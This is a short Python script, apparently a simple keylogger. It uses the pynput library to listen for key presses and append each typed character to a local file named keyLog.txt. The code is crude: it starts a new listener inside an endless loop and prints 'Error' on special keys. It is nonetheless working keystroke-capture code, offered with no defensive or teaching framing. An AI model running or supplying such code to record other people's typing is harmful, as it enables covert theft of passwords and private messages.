from pynput import keyboard

while True:
    def keyPress(key):
        with open("keyLog.txt", 'a') as key_file:
            try:
                key_file.write('\n')
                char = key.char
                key_file.write(char)
            except:
                print("Error")
        
    listener = keyboard.Listener(on_press=keyPress)
    listener.start()
    input()

    
